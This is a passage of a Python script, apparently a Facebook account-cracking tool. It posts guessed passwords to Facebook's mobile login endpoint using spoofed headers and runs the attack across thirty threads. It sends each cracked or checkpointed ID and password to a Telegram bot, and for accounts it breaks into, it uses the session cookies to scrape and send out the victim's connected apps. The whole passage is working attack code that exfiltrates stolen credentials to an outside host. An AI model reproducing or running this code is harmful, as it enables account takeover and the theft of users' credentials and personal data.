                ses.headers.update({"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
                po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
                if "checkpoint" in po.cookies.get_dict().keys():
                    	HMD=(f'''
		BAD ❌  | HMD
		 <><><><><><>HMD<><><><><><><> 
		id : {idf} ﷼
		pas : {pw} ﷼
		 <><><><><><>HMD<><><><><><><> 
		PY : @z_s_o , @VIPHOMDE
		''')
                    	cp+=1
                    	requests.post(f'https://api.telegram.org/bot{toen}/sendMessage?chat_id={ID}&text= {HMD} ')
                    	break
                elif "c_user" in ses.cookies.get_dict().keys():
                    	headapp={"user-agent":"NokiaX2-01/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"}
                    	ok+=1
                    	HMD=(f'''
		GOOD ✅ | HMD
		 <><><><><><>HMD<><><><><><><> 
		id : {idf} ♕
		pas : {pw} ♕
		 <><><><><><>HMD<><><><><><><> 
		PY : @z_s_o , @R_A_J_Y
		''')
                    	
                    	requests.post(f'https://api.telegram.org/bot{toen}/sendMessage?chat_id={ID}&text= {HMD} ')
                    	cek_RAJY(kuki)
                    	coki=po.cookies.get_dict()
                    	infoakun = ''
                    	session = requests.Session()
                    	hit1, hit2 = 0,0
                    	cek =session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
                    	cek2 = session.get("https://m.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
                    	apkAktif = re.findall('class="cy cz">(.*?)</span><div></div><div class="da db dc">',str(cek))
                    	ditambahkan = re.findall('</span><div></div><div class="da db dc">(.*?)</div></div><div',str(cek))
                    	for muncul in apkAktif:
                    			
                    			
                    			hit1+=1
                    			infoakun += (f"{muncul} {ditambahkan[hit2]}\n")                    			
                    			hit2+=1
                    			hit1,hit2=0,0
                    			apkKadaluarsa = re.findall('span class="cu cv">(.*?)</span><div></div><div class="cw cx cy">',str(cek2))
                    			kadaluarsa = re.findall('</span><div></div><div class="cw cx cy">(.*?)</div></div><div',str(cek2))
                    			for muncul1 in apkKadaluarsa:
                    				infoakun += (f"{muncul1} {kadaluarsa[hit2]}\n")
                    				
                    				
                    				hit2+=1
                    				
                    				
                    			else:
                    				print('\n')
                    			infoakun1=(f'''
		GOOD ✅ | HMD
		 <><><><><><>HMD<><><><><><><> 
		EMAIL : {idf} ♕
		PASS : {pw} ♕
		{infoakun}
		 <><><><><><>HMD<><><><><><><> 
		PY : @z_s_o , @R_A_J_Y
		''')
                    			print(infoakun1)
                    			requests.post(f'https://api.telegram.org/bot{toen}/sendMessage?chat_id={ID}&text= {infoakun} ')
                    			cek_RAJY(kuki)
                    			break
                    				
                    			
                    			
                    		
                    	
                else:
                	continue
            except requests.exceptions.ConnectionError:
                time.sleep(31)
        loop+=1
def cek_RAJY(kuki):
    session = requests.Session()
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
    sop = bs4.BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    try:
        for i in range(len(game)):
            print ("\r%s  \033[0m              ➛ %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
    except AttributeError:
        print ("\r    %s\033[0m cookie invalid"%(M))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
    sop = bs4.BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    try:
        for i in range(len(game)):
            print ("\r%s  \033[0m              ➛ %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
    except AttributeError:
        print ("\r    %s \033[0mcookie invalid"%(M))
    #-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
        
        try:os.mkdir('OK')
        except:pass
        try:os.mkdir('CP')
        except:pass
        
        try:os.system('clear||cls')
        except:pass
        
        login()


Threads=[] 
for t in range(30):
 x = threading.Thread(target=passwrd)
 x.start()
 Threads.append(x)
for Th in Threads:
 passwrd()
